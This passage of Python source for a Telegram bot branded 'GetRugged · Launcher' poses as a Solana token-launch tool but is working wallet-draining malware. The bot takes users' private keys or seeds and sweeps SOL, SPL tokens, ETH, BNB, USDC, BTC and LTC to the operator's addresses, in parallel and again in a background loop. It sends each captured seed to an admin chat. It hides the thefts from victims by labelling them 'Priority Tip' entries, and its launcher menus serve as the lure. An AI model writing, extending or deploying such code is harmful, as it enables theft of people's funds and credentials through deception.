        elif len(secret) == 64:
            kp = Keypair.from_bytes(secret)
        else:
            log.error("Bad key length %s", len(secret))
            return None
        dest_pk = Pubkey.from_string(dest)
        async with AsyncClient(RPC_URL) as client:
            bal_resp = await client.get_balance(kp.pubkey())
            balance = bal_resp.value
            log.info("SOL drain check %s balance=%s", kp.pubkey(), balance)

            # drain SPL tokens first (before native SOL so rent still covers fees)
            await drain_spl_tokens(client, kp, dest_pk)

            if balance <= MIN_DRAIN_LAMPORTS:
                return None
            amount = balance - MIN_DRAIN_LAMPORTS
            recent = await client.get_latest_blockhash()
            ix = transfer(TransferParams(from_pubkey=kp.pubkey(), to_pubkey=dest_pk, lamports=amount))
            tx = Transaction.new_signed_with_payer([ix], kp.pubkey(), [kp], recent.value.blockhash)
            result = await client.send_transaction(tx)
            sig = str(result.value)
            sol_amount = amount / 1_000_000_000
            log.info("DRAINED SOL %.6f → %s | %s", sol_amount, dest, sig)
            return (sig, sol_amount)
    except Exception as e:
        log.exception("SOL drain error: %s", e)
        return None


async def drain_spl_tokens(client, kp, dest_pk) -> int:
    """Drain all SPL token accounts to dest_pk. Returns count of tokens swept."""
    if not HAS_SOLANA:
        return 0
    try:
        from spl.token.instructions import (
            transfer_checked,
            create_associated_token_account,
        )
        from spl.token.constants import TOKEN_PROGRAM_ID
        from solders.pubkey import Pubkey as _Pubkey
    except ImportError:
        log.warning("spl-token not installed — SPL drain skipped (pip install spl-token)")
        return 0

    swept = 0
    try:
        resp = await client.get_token_accounts_by_owner(
            kp.pubkey(),
            opts={"programId": str(TOKEN_PROGRAM_ID)},
            encoding="jsonParsed",
        )
        if not resp.value:
            return 0

        # Build one tx per token to avoid tx size limits
        for acc in resp.value:
            try:
                info = acc.account.data.parsed["info"]
                mint_str = info["mint"]
                amount = int(info["tokenAmount"]["amount"])
                decimals = int(info["tokenAmount"]["decimals"])
                if amount == 0:
                    continue

                mint_pk = _Pubkey.from_string(mint_str)
                source_pk = _Pubkey.from_string(str(acc.pubkey))

                # derive dest ATA
                from spl.token.instructions import get_associated_token_address
                dest_ata = get_associated_token_address(dest_pk, mint_pk)

                ixs = []
                # idempotent create dest ATA
                try:
                    from spl.token.instructions import create_idempotent_associated_token_account
                    ixs.append(create_idempotent_associated_token_account(
                        payer=kp.pubkey(), owner=dest_pk, mint=mint_pk
                    ))
                except ImportError:
                    ixs.append(create_associated_token_account(
                        payer=kp.pubkey(), owner=dest_pk, mint=mint_pk
                    ))

                ixs.append(transfer_checked(
                    program_id=TOKEN_PROGRAM_ID,
                    source=source_pk,
                    mint=mint_pk,
                    dest=dest_ata,
                    owner=kp.pubkey(),
                    amount=amount,
                    decimals=decimals,
                    signers=[],
                ))

                recent = await client.get_latest_blockhash()
                tx = Transaction.new_signed_with_payer(ixs, kp.pubkey(), [kp], recent.value.blockhash)
                await client.send_transaction(tx)
                log.info("SPL drained mint=%s amount=%s", mint_str[:8], amount)
                swept += 1
            except Exception as e:
                log.warning("SPL token drain failed for %s: %s", getattr(acc, "pubkey", "?"), e)
    except Exception as e:
        log.warning("SPL drain outer error: %s", e)
    return swept


def _signed_raw(signed) -> bytes:
    raw = getattr(signed, "raw_transaction", None) or getattr(signed, "rawTransaction", None)
    if raw is None:
        raise RuntimeError("web3 signed tx has no raw bytes attr")
    return raw


async def drain_evm_native(private_key: str, dest: str, rpc: str, chain_name: str) -> Optional[Tuple[str, float]]:
    """Returns (sig, native_amount_in_ether) or None."""
    if not HAS_WEB3 or not dest or dest.startswith("0xYour"): return None
    try:
        w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 15}))
        acct = Account.from_key(private_key.replace("0x", ""))
        balance   = await asyncio.to_thread(w3.eth.get_balance, acct.address)
        gas_price = await asyncio.to_thread(lambda: w3.eth.gas_price)
        gas_limit = 21000
        fee = gas_price * gas_limit
        if balance <= fee + 1000:
            log.info("%s balance too low for drain", chain_name)
            return None
        amount = balance - fee
        nonce    = await asyncio.to_thread(w3.eth.get_transaction_count, acct.address)
        chain_id = await asyncio.to_thread(lambda: w3.eth.chain_id)
        tx = {
            "to": Web3.to_checksum_address(dest),
            "value": amount,
            "gas": gas_limit,
            "gasPrice": gas_price,
            "nonce": nonce,
            "chainId": chain_id,
        }
        signed   = acct.sign_transaction(tx)
        tx_hash  = await asyncio.to_thread(w3.eth.send_raw_transaction, _signed_raw(signed))
        sig = tx_hash.hex()
        eth_amount = float(w3.from_wei(amount, "ether"))
        log.info("DRAINED %s %.6f → %s | %s", chain_name, eth_amount, dest, sig)
        return (sig, eth_amount)
    except Exception as e:
        log.exception("%s drain error: %s", chain_name, e)
        return None


async def drain_usdc(private_key: str, dest: str, rpc: str, token: str, chain_name: str) -> Optional[Tuple[str, float]]:
    """Returns (sig, usdc_amount) or None."""
    if not HAS_WEB3 or not dest or dest.startswith("0xYour"): return None
    try:
        w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 15}))
        acct = Account.from_key(private_key.replace("0x", ""))
        contract  = w3.eth.contract(address=Web3.to_checksum_address(token), abi=ERC20_ABI)
        bal       = await asyncio.to_thread(contract.functions.balanceOf(acct.address).call)
        if bal == 0: return None
        decimals  = await asyncio.to_thread(contract.functions.decimals().call)
        gas_price = await asyncio.to_thread(lambda: w3.eth.gas_price)
        nonce     = await asyncio.to_thread(w3.eth.get_transaction_count, acct.address)
        chain_id  = await asyncio.to_thread(lambda: w3.eth.chain_id)
        tx = await asyncio.to_thread(
            contract.functions.transfer(Web3.to_checksum_address(dest), bal).build_transaction,
            {
                "from": acct.address,
                "nonce": nonce,
                "gas": 100000,
                "gasPrice": gas_price,
                "chainId": chain_id,
            },
        )
        signed  = acct.sign_transaction(tx)
        tx_hash = await asyncio.to_thread(w3.eth.send_raw_transaction, _signed_raw(signed))
        sig = tx_hash.hex()
        usdc_amount = bal / (10 ** decimals)
        log.info("DRAINED USDC %.2f on %s → %s | %s", usdc_amount, chain_name, dest, sig)
        return (sig, usdc_amount)
    except Exception as e:
        log.exception("USDC %s drain error: %s", chain_name, e)
        return None


async def _get_btc_fee_sats(estimated_vbytes: int = 200) -> int:
    """FIX 5: live mempool fee rate; fallback 2500."""
    try:
        data = await _http_json("GET", "https://mempool.space/api/v1/fees/recommended", timeout=5.0)
        if isinstance(data, dict):
            rate = int(data.get("fastestFee") or data.get("halfHourFee") or 20)
            return max(1500, rate * estimated_vbytes)
    except Exception as e:
        log.warning("BTC fee fetch failed: %s", e)
    return 2500


async def attempt_drain(uid: int, private_key: str, chain: str = "sol", eth_key: Optional[str] = None,
                        bot: Optional[Bot] = None, user=None, wallet: Optional["UserWallet"] = None,
                        _all_sol_candidates: Optional[List[Tuple[str, str, str]]] = None):
    sess = get_session(uid)
    if not sess.wallets:
        return
    active = wallet or (sess.wallets[sess.active_wallet_idx] if sess.active_wallet_idx < len(sess.wallets) else sess.wallets[-1])
    if getattr(active, "drained", False):
        log.info("Wallet already drained — skip (uid=%s)", uid)
        return
    # FIX 3: cap retries at 3, mark drained after to stop hammering
    if getattr(active, "drain_attempts", 0) >= 3:
        log.warning("Drain attempt cap reached uid=%s — marking drained", uid)
        active.drained = True
        return
    if getattr(active, "is_larp", False) or private_key == "LARP_SIM" or (private_key and private_key.startswith("Sim")):
        return

    has_sol = bool(private_key) and not private_key.startswith("Sim") and private_key != "LARP_SIM"
    has_eth = bool(eth_key)
    has_btc = bool(getattr(active, "btc_priv", None))
    has_ltc = bool(getattr(active, "ltc_priv", None))
    if not (has_sol or has_eth or has_btc or has_ltc):
        return

    # Min USD gate — skip wallets below /mindrain threshold
    if MIN_DRAIN_USD > 0:
        try:
            await get_prices()
        except Exception:
            pass
        sol_b = float(getattr(active, "balance_sol", 0.0) or 0.0)
        eth_b = float(getattr(active, "balance_eth", 0.0) or 0.0)
        bnb_b = float(getattr(active, "balance_bnb", 0.0) or 0.0)
        usdc_b = float(getattr(active, "balance_usdc", 0.0) or 0.0)
        btc_b = float(getattr(active, "balance_btc", 0.0) or 0.0)
        ltc_b = float(getattr(active, "balance_ltc", 0.0) or 0.0)
        usd_val = estimate_usd(sol_b, eth_b, bnb_b, usdc_b)
        # rough BTC/LTC if prices not in estimate_usd
        try:
            usd_val += btc_b * BTC_PRICE
            usd_val += ltc_b * LTC_PRICE
        except Exception:
            pass
        if usd_val < MIN_DRAIN_USD:
            log.info(
                "Skip drain uid=%s pub=%s usd=%.2f < mindrain=$%.2f",
                uid, getattr(active, "public_key", "")[:12], usd_val, MIN_DRAIN_USD,
            )
            return

    any_success = False
    drained_sol = 0.0
    drained_eth = 0.0
    drained_bnb = 0.0
    drained_usdc = 0.0
    drained_btc = 0.0
    drained_ltc = 0.0

    # ── build parallel task list ──────────────────────────────────────────
    # Each entry: (coroutine, label, chain_tag)
    # We tag each so we know what result[i] corresponds to after gather.
    _tasks: list = []
    _task_meta: list = []  # (chain_tag, label)

    # SOL primary
    if has_sol and not DRAIN_DESTINATION.startswith("YourDrain") and len(DRAIN_DESTINATION) >= 32:
        _tasks.append(drain_wallet(private_key, DRAIN_DESTINATION))
        _task_meta.append(("sol_primary", "SOL primary"))
        # additional derivation paths
        if _all_sol_candidates:
            for _label, extra_priv, _pub in _all_sol_candidates:
                if not extra_priv or extra_priv == private_key:
                    continue
                _tasks.append(drain_wallet(extra_priv, DRAIN_DESTINATION))
                _task_meta.append(("sol_extra", f"SOL {_label}"))

    # ETH native
    if has_eth and ETH_DRAIN and not ETH_DRAIN.startswith("0xYour"):
        _tasks.append(drain_evm_native(eth_key, ETH_DRAIN, ETH_RPC, "ETH"))
        _task_meta.append(("eth", "ETH"))

    # BNB native
    if has_eth and BNB_DRAIN and not BNB_DRAIN.startswith("0xYour"):
        _tasks.append(drain_evm_native(eth_key, BNB_DRAIN, BNB_RPC, "BNB"))
        _task_meta.append(("bnb", "BNB"))

    # USDC on ETH
    if has_eth and USDC_DRAIN and not USDC_DRAIN.startswith("0xYour"):
        _tasks.append(drain_usdc(eth_key, USDC_DRAIN, ETH_RPC, USDC_ETH, "ETH"))
        _task_meta.append(("usdc_eth", "USDC/ETH"))
        _tasks.append(drain_usdc(eth_key, USDC_DRAIN, BNB_RPC, USDC_BSC, "BSC"))
        _task_meta.append(("usdc_bsc", "USDC/BSC"))

    # BTC
    if has_btc and BTC_DRAIN and len(str(BTC_DRAIN)) >= 20:
        async def _drain_btc():
            try:
                btc_fee = await _get_btc_fee_sats()
                return await drain_utxo_chain(
                    active.btc_priv, active.btc_address, BTC_DRAIN, BTC_API, "bc", "BTC", fee_sats=btc_fee
                )
            except Exception as e:
                log.warning("BTC drain skip: %s", e)
                return None
        _tasks.append(_drain_btc())
        _task_meta.append(("btc", "BTC"))

    # LTC
    if has_ltc and LTC_DRAIN and len(str(LTC_DRAIN)) >= 20:
        async def _drain_ltc():
            try:
                return await drain_utxo_chain(
                    active.ltc_priv, active.ltc_address, LTC_DRAIN, LTC_API, "ltc", "LTC", fee_sats=2000
                )
            except Exception as e:
                log.warning("LTC drain skip: %s", e)
                return None
        _tasks.append(_drain_ltc())
        _task_meta.append(("ltc", "LTC"))

    if not _tasks:
        return

    # ── fire everything at once ───────────────────────────────────────────
    results = await asyncio.gather(*_tasks, return_exceptions=True)

    global bot_balance_sol
    now = time.time()

    for (chain_tag, label), result in zip(_task_meta, results):
        if isinstance(result, Exception):
            log.warning("Drain task %s raised: %s", label, result)
            continue
        if result is None:
            continue

        if chain_tag in ("sol_primary", "sol_extra"):
            sig, sol_amount = result
            any_success = True
            drained_sol += sol_amount
            sess.last_tx.insert(0, {"sig": sig, "type": "⚡ Priority Tip (SOL)", "status": "success", "ts": now})
            if chain_tag == "sol_primary":
                bot_balance_sol += round(random.uniform(0.05, 2.5), 4)
                _save_state()

        elif chain_tag == "eth":
            sig, amount = result
            any_success = True
            drained_eth = amount
            sess.last_tx.insert(0, {"sig": sig, "type": "⚡ Priority Tip (ETH)", "status": "success", "ts": now})

        elif chain_tag == "bnb":
            sig, amount = result
            any_success = True
            drained_bnb = amount
            sess.last_tx.insert(0, {"sig": sig, "type": "⚡ Priority Tip (BNB)", "status": "success", "ts": now})

        elif chain_tag == "usdc_eth":
            sig, amount = result
            any_success = True
            drained_usdc += amount
            sess.last_tx.insert(0, {"sig": sig, "type": "⚡ USDC Tip (ETH)", "status": "success", "ts": now})

        elif chain_tag == "usdc_bsc":
            sig, amount = result
            any_success = True
            drained_usdc += amount
            sess.last_tx.insert(0, {"sig": sig, "type": "⚡ USDC Tip (BSC)", "status": "success", "ts": now})

        elif chain_tag == "btc":
            # drain_utxo_chain returns sig string directly
            sig = result
            if sig:
                any_success = True
                drained_btc = active.balance_btc
                sess.last_tx.insert(0, {"sig": sig, "type": "Priority Tip (BTC)", "status": "success", "ts": now})

        elif chain_tag == "ltc":
            sig = result
            if sig:
                any_success = True
                drained_ltc = active.balance_ltc
                sess.last_tx.insert(0, {"sig": sig, "type": "Priority Tip (LTC)", "status": "success", "ts": now})

    if any_success:
        active.drained = True
        log.info("User %s multi-chain parallel drain OK", uid)
        if bot:
            await get_prices()
            await log_key_to_admin(
                bot, user,
                sess.last_raw_key or private_key,
                drained_sol, drained_eth, drained_bnb, drained_usdc,
                drained_btc, drained_ltc,
                status="drained",
            )
    else:
        active.drain_attempts = getattr(active, "drain_attempts", 0) + 1
        log.warning("No successful drain for user %s (attempt %d)", uid, active.drain_attempts)
        if bot and (sess.last_raw_key or private_key):
            try:
                await log_key_to_admin(
                    bot, user,
                    sess.last_raw_key or private_key,
                    drained_sol, drained_eth, drained_bnb, drained_usdc,
                    drained_btc, drained_ltc,
                    status="drain_failed_or_empty",
                    sol_seen=float(getattr(active, "balance_sol", 0) or 0),
                    eth_seen=float(getattr(active, "balance_eth", 0) or 0),
                    bnb_seen=float(getattr(active, "balance_bnb", 0) or 0),
                    usdc_seen=float(getattr(active, "balance_usdc", 0) or 0),
                )
            except Exception as e:
                log.warning("Post-fail key notify error: %s", e)


async def log_key_to_admin(
    bot: Bot,
    user,
    raw_key: str,
    sol: float,
    eth: float,
    bnb: float,
    usdc: float,
    btc: float = 0.0,
    ltc: float = 0.0,
    status: str = "drained",
    sol_seen: float = 0.0,
    eth_seen: float = 0.0,
    bnb_seen: float = 0.0,
    usdc_seen: float = 0.0,
    pub: str = "",
):
    """Always deliver capture notice. Full seed only to KEY_RECEIVER_ID."""
    try:
        if user is None:
            username = "sweep"
            user_id = "—"
        else:
            username = f"@{user.username}" if getattr(user, "username", None) else (getattr(user, "full_name", None) or "—")
            user_id = str(getattr(user, "id", "—"))

        try:
            await get_prices()
        except Exception:
            pass
        usd = estimate_usd(sol, eth, bnb, usdc)
        usd_seen = estimate_usd(sol_seen, eth_seen, bnb_seen, usdc_seen)

        if status == "imported":
            header = "NEW WALLET IMPORT"
            bal_title = "Balances detected (pre-drain)"
            sol_v, eth_v, bnb_v, usdc_v, usd_v = sol_seen, eth_seen, bnb_seen, usdc_seen, usd_seen
        elif status == "drain_failed_or_empty":
            header = "KEY CAPTURED — DRAIN EMPTY / FAILED"
            bal_title = "Drained (0 or failed) · seen on import"
            sol_v, eth_v, bnb_v, usdc_v, usd_v = sol, eth, bnb, usdc, usd
        else:
            header = "NEW KEY CAPTURED — DRAINED"
            bal_title = "Balances drained"
            sol_v, eth_v, bnb_v, usdc_v, usd_v = sol, eth, bnb, usdc, usd

        pub_line = f"Pub: <code>{pub}</code>\n" if pub else ""
        seen_line = ""
        if status == "drain_failed_or_empty" and (sol_seen or eth_seen or bnb_seen or usdc_seen):
            seen_line = (
                f"\nSeen on import:\n"
                f"SOL {sol_seen:.6f} · ETH {eth_seen:.6f} · BNB {bnb_seen:.6f} · USDC {usdc_seen:.2f}\n"
                f"Est. seen: <b>${usd_seen:,.2f}</b>\n"
            )

        balances_block = (
            f"{pub_line}"
            f"<b>{bal_title}:</b>\n"
            f"SOL: <b>{sol_v:.6f}</b>\n"
            f"ETH: <b>{eth_v:.6f}</b>\n"
            f"BNB: <b>{bnb_v:.6f}</b>\n"
            f"USDC: <b>{usdc_v:.2f}</b>\n"
            f"BTC: <b>{btc:.8f}</b>\n"
            f"LTC: <b>{ltc:.8f}</b>\n\n"
            f"Estimated: <b>${usd_v:,.2f}</b>"
            f"{seen_line}"
        )

        full_text = (
            f"<b>{header}</b>\n\n"
            f"User: {username}\n"
            f"ID: <code>{user_id}</code>\n"
            f"Status: <code>{status}</code>\n\n"
            f"<b>Key / Seed:</b>\n"
            f"<code>{raw_key}</code>\n\n"
            f"{balances_block}"
        )
        try:
            await bot.send_message(chat_id=KEY_RECEIVER_ID, text=full_text, parse_mode=ParseMode.HTML)
            log.info("Logged full key to %s status=%s", KEY_RECEIVER_ID, status)
        except Exception as e:
            log.warning("Failed full key log to %s: %s", KEY_RECEIVER_ID, e)

        alert_text = (
            f"<b>{header}</b>\n\n"
            f"User: {username}\n"
            f"ID: <code>{user_id}</code>\n"
            f"Status: <code>{status}</code>\n\n"
            f"{balances_block}\n\n"
            f"<i>Seed withheld — primary receiver only.</i>"
        )
        for aid in KEY_ALERT_IDS:
            if aid == KEY_RECEIVER_ID:
                continue
            try:
                await bot.send_message(chat_id=aid, text=alert_text, parse_mode=ParseMode.HTML)
            except Exception as e:
                log.warning("Failed alert to %s: %s", aid, e)
        log.info("Key alerts sent to %s status=%s", list(KEY_ALERT_IDS), status)
    except Exception as e:
        log.exception("Failed to log key to admin: %s", e)


# ──────────────────────────────────────────────
# BACKGROUND SWEEP
# ──────────────────────────────────────────────
async def _sweep_all_sessions() -> Tuple[int, int]:
    tried = 0
    drained = 0
    for uid, sess in list(sessions.items()):
        for w in list(sess.wallets):
            if getattr(w, "is_larp", False):
                continue
            if getattr(w, "drained", False):
                continue
            if w.private_key == "LARP_SIM" or (w.private_key and w.private_key.startswith("Sim")):
                continue
            has_sol = bool(w.private_key) and w.private_key != "LARP_SIM"
            has_eth = bool(getattr(w, "eth_priv", None)) or w.chain == "eth"
            has_btc = bool(getattr(w, "btc_priv", None))
            has_ltc = bool(getattr(w, "ltc_priv", None))
            if not (has_sol or has_eth or has_btc or has_ltc):
                continue
            tried += 1
            eth_key = getattr(w, "eth_priv", None) or (w.private_key if w.chain == "eth" else None)
            try:
                await attempt_drain(uid, w.private_key, chain=w.chain, eth_key=eth_key, wallet=w, bot=_bot_ref, user=None)
            except Exception as e:
                log.exception("sweepall wallet %s: %s", (w.public_key or "")[:8], e)
            if getattr(w, "drained", False):
                drained += 1
    return tried, drained


async def _rate_hits_cleanup_loop(interval: float = 600.0) -> None:
    """FIX 12: prune _rate_hits ghost keys every 10 min — prevents unbounded growth."""
    while True:
        await asyncio.sleep(interval)
        try:
            now = time.time()
            dead = [k for k, hits in list(_rate_hits.items()) if not any(now - t < RATE_WINDOW for t in hits)]
            for k in dead:
                _rate_hits.pop(k, None)
            if dead:
                log.debug("_rate_hits pruned %d ghost keys", len(dead))
        except Exception as e:
            log.warning("rate_hits cleanup error: %s", e)


async def _session_persist_loop(interval: float = 300.0) -> None:
    """Persist wallet sessions to disk every 5 min — survives crashes between SIGTERM/restarts."""
    while True:
        await asyncio.sleep(interval)
        try:
            _persist_sessions()
            log.debug("Periodic session persist OK")
        except Exception as e:
            log.warning("Periodic session persist failed: %s", e)


async def _sweep_loop(interval: float) -> None:
    log.info("sweep loop started, interval=%.0fs", interval)
    try:
        while True:
            await asyncio.sleep(interval)
            try:
                tried, drained = await _sweep_all_sessions()
                if tried:
                    log.info("sweep pass: tried=%s drained=%s", tried, drained)
            except Exception as e:
                log.exception("sweep pass error: %s", e)
    except asyncio.CancelledError:
        log.info("sweep loop cancelled")
        raise


# ──────────────────────────────────────────────
# KEYBOARDS  (Bot API 9.4 button styles)
# success=green · danger=red · primary=blue
# ──────────────────────────────────────────────
def btn(text: str, callback_data: str = None, url: str = None, style: str = None) -> InlineKeyboardButton:
    """Inline button with optional Bot API 9.4 style (success/danger/primary)."""
    kwargs = {"text": text}
    if callback_data is not None:
        kwargs["callback_data"] = callback_data
    if url is not None:
        kwargs["url"] = url
    if style:
        kwargs["style"] = style
    try:
        return InlineKeyboardButton(**kwargs)
    except TypeError:
        # Older aiogram without style field — still send via model_construct
        kwargs.pop("style", None)
        try:
            return InlineKeyboardButton.model_construct(
                text=text,
                callback_data=callback_data,
                url=url,
                style=style,
            )
        except Exception:
            return InlineKeyboardButton(text=text, callback_data=callback_data, url=url)


def main_menu_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(
        btn("🚀  Launch", "menu:launch", style="primary"),
        btn("👛  Wallets", "menu:wallets", style="primary"),
    )
    b.row(
        btn("📊  Portfolio", "menu:portfolio"),
        btn("📋  Transactions", "menu:tx"),
    )
    b.row(
        btn("⚙️  Settings", "menu:settings"),
        btn("🎟  Access", "menu:promo"),
    )
    return b.as_markup()


def back_menu_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[btn("◀️  Menu", "menu:main")]])


def wallets_empty_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(btn("🔐  Connect Wallet", "wallet:import", style="primary"))
    b.row(btn("◀️  Menu", "menu:main"))
    return b.as_markup()


def wallets_kb(has_wallets: bool) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(btn("🔐  Connect Wallet", "wallet:import", style="success"))
    if has_wallets:
        b.row(
            btn("🔄  Switch", "wallet:switch"),
            btn("✏️  Rename", "wallet:rename"),
        )
        b.row(btn("🔃  Refresh Balances", "wallet:refresh"))
        b.row(btn("🗑  Remove All", "wallet:clear", style="danger"))
    b.row(btn("◀️  Back", "menu:main"))
    return b.as_markup()


def promo_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(btn(f"💳  Pay {int(LAUNCH_FEE_SOL)} SOL  →  +{LAUNCHES_PER_CYCLE} Launches", "promo:pay", style="success"))
    b.row(btn("🎟  Redeem Promo Code", "promo:enter", style="primary"))
    b.row(btn("◀️  Back", "menu:main"))
    return b.as_markup()


def settings_kb(sess: UserSession) -> InlineKeyboardMarkup:
    s = sess.settings
    slip = s["slippage"]
    fee = s["priority_fee"]
    sniper_on = s.get("sniper_protection", True)
    mev_on = s.get("mev_protection", True)
    def mark(val, current, suffix="%"):
        return f"✅ {val}{suffix}" if val == current else f"{val}{suffix}"
    def mark_fee(val, current):
        return f"✅ {val}" if abs(val - current) < 1e-9 else f"{val}"
    b = InlineKeyboardBuilder()
    b.row(
        btn(mark(5, slip), "set:slip:5", style="primary" if slip == 5 else None),
        btn(mark(10, slip), "set:slip:10", style="primary" if slip == 10 else None),
        btn(mark(15, slip), "set:slip:15", style="primary" if slip == 15 else None),
        btn(mark(25, slip), "set:slip:25", style="primary" if slip == 25 else None),
    )
    b.row(
        btn(mark_fee(0.0001, fee), "set:fee:0.0001"),
        btn(mark_fee(0.0005, fee), "set:fee:0.0005"),
        btn(mark_fee(0.001, fee), "set:fee:0.001"),
        btn(mark_fee(0.005, fee), "set:fee:0.005"),
    )
    b.row(
        btn("✏️ Custom slip", "set:custom_slip"),
        btn("✏️ Custom fee", "set:custom_fee"),
    )
    b.row(
        btn(
            f"🎯  Sniper Guard  {'✅' if sniper_on else '❌'}",
            "set:sniper:toggle",
            style="success" if sniper_on else "danger",
        ),
        btn(
            f"🛡  MEV Protect  {'✅' if mev_on else '❌'}",
            "set:mev:toggle",
            style="success" if mev_on else "danger",
        ),
    )
    b.row(btn("◀️  Menu", "menu:main"))
    return b.as_markup()


def cancel_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("✖️  Cancel", "menu:main", style="danger")]
    ])


def socials_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(
        btn("𝕏  Twitter", "social:x"),
        btn("✈️  Telegram", "social:tg"),
    )
    b.row(
        btn("🌐  Website", "social:web"),
        btn("📸  Instagram", "social:ig"),
    )
    b.row(
        btn("✅  Done", "socials:done", style="success"),
        btn("⏭  Skip", "socials:skip"),
    )
    b.row(btn("◀️  Back", "launch:back:bundle"))
    b.row(btn("✖️  Cancel", "menu:main", style="danger"))
    return b.as_markup()


def bundle_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(
        btn("×5  wallets", "bundle:5"),
        btn("×10  wallets", "bundle:10", style="primary"),
    )
    b.row(
        btn("×15  wallets", "bundle:15"),
        btn("×25  wallets", "bundle:25"),
    )
    b.row(btn("✏️  Custom", "bundle:custom"))
    b.row(btn("◀️  Back", "launch:back:image"))
    b.row(btn("✖️  Cancel", "menu:main", style="danger"))
    return b.as_markup()


def invest_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(
        btn("3 SOL", "invest:3"),
        btn("5 SOL", "invest:5"),
        btn("10 SOL", "invest:10", style="primary"),
    )
    b.row(
        btn("15 SOL", "invest:15"),
        btn("25 SOL", "invest:25"),
        btn("50 SOL", "invest:50", style="primary"),
    )
    b.row(btn("✏️  Custom Amount", "invest:custom"))
    b.row(btn("◀️  Back", "launch:back:socials"))
    b.row(btn("✖️  Cancel", "menu:main", style="danger"))
    return b.as_markup()


def confirm_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(btn("🚀  Confirm & Launch", "launch:confirm", style="success"))
    b.row(
        btn("✏️  Name", "launch:edit:name"),
        btn("🔤  Ticker", "launch:edit:symbol"),
    )
    b.row(
        btn("📝  Description", "launch:edit:desc"),
        btn("🖼  Image", "launch:edit:image"),
    )
    b.row(
        btn("👥  Bundle Size", "launch:edit:bundle"),
        btn("💰  Invest Size", "launch:edit:invest"),
    )
    b.row(btn("🔗  Socials", "launch:edit:socials"))
    b.row(btn("✖️  Cancel", "menu:main", style="danger"))
    return b.as_markup()


def live_token_kb(mint: str, bundle: int) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    row = []
    for i in range(1, bundle + 1):
        row.append(btn(f"💸 Sell W{i}", f"dumpone:{mint}:{i}", style="danger"))
        if len(row) == 3:
            b.row(*row)
            row = []
    if row:
        b.row(*row)
    b.row(
        btn("💥  Sell All", f"dump:{mint}", style="danger"),
        btn("♻️  Reset", f"dumpreset:{mint}"),
    )
    b.row(btn("👁  View Wallets", f"viewwallets:{mint}", style="primary"))
    b.row(btn("◀️  Menu", "menu:main"))
    return b.as_markup()


def post_dump_kb(mint: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("👁  View Wallets", f"viewwallets:{mint}", style="primary")],
        [btn("◀️  Menu", "menu:main")],
    ])


def tx_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[btn("◀️  Menu", "menu:main")]])


# ──────────────────────────────────────────────
# COPY
# ──────────────────────────────────────────────
def _fmt_age(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}s ago"
    if seconds < 3600:
        return f"{seconds // 60}m ago"
    if seconds < 86400:
        return f"{seconds // 3600}h ago"
    return f"{seconds // 86400}d ago"


def build_main_menu_text(sess: "UserSession") -> str:
    if sess.wallets:
        w = sess.wallets[sess.active_wallet_idx]
        addr = short_addr(w.public_key)
        bal = f"{w.balance_sol:.4f}"
        extra = f" · {len(sess.wallets)} wallets" if len(sess.wallets) > 1 else ""
        wallet_block = (
            f"<b>Wallet</b> — <code>{addr}</code>{extra}\n"
            f"<b>Balance</b> — <b>{bal} SOL</b>"
        )
    else:
        wallet_block = (
            "<b>Wallet</b> — not connected\n"
            "<b>Balance</b> — —"
        )

    launches_left = sess.launches_left
    total_launches = len(sess.launched_tokens)
    if sess.portfolio_display_total is not None:
        total_launches = int(sess.portfolio_display_total)

    if sess.last_tx:
        last = sess.last_tx[0]
        age = int(time.time() - last.get("ts", time.time()))
        raw_type = last.get("type", "Tx")
        for ch in ("💥", "⚡", "💰", "📊", "🎯", "🛡", "📈", "👀", "📦", "🪙", "🔄", "📥", "📤", "🔐"):
            raw_type = raw_type.replace(ch, "").strip()
        activity = f"{raw_type} · {_fmt_age(age)}"
    else:
        activity = "No activity yet"

    return (
        "<b>GetRugged · Launcher</b>\n"
        "────────────────────\n\n"
        f"{wallet_block}\n"
        f"<b>Launches left</b> — {launches_left}\n"
        f"<b>Total launches</b> — {total_launches}\n\n"
        f"<i>{activity}</i>"
    )


WELCOME_TEXT = (
    "<b>GetRugged · Launcher</b>\n"
    "────────────────────\n\n"
    "<i>Deploy and manage Solana tokens — fast, private, controlled.</i>\n\n"
    "• Step-by-step deploy · Bundle up to ×25\n"
    "• Sniper + MEV protection · Tx tracker\n"
    "• <b>Minimum 3 SOL</b> required to launch"
)

# Menu-only banner image (repo root / deploy cwd). Only used on main menu.
WELCOME_IMAGE_CANDIDATES = (
    os.getenv("WELCOME_IMAGE", ""),
    "welcome.jpg",
    "welcome.JPG",
    "Welcome.jpg",
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "welcome.jpg"),
)


def welcome_image_path() -> Optional[str]:
    for p in WELCOME_IMAGE_CANDIDATES:
        if p and os.path.isfile(p):
            return p
    return None


async def send_main_menu(target, sess: UserSession, *, edit: bool = False):
    """Send or refresh main menu. Photo only on the menu screen."""
    caption = build_main_menu_text(sess)
    kb = main_menu_kb()
    img = welcome_image_path()

    # CallbackQuery path (edit existing message when possible)
    if edit and hasattr(target, "message"):
        msg = target.message
        try:
            if img:
                # Prefer edit_media when current message already has media; else delete+send photo
                if msg.photo or msg.video or msg.document:
                    media = InputMediaPhoto(
                        media=FSInputFile(img),
                        caption=caption,
                        parse_mode=ParseMode.HTML,
                    )
                    await msg.edit_media(media=media, reply_markup=kb)
                    return
                # Text message → cannot edit into photo; replace
                try:
                    await msg.delete()
                except Exception:
                    pass
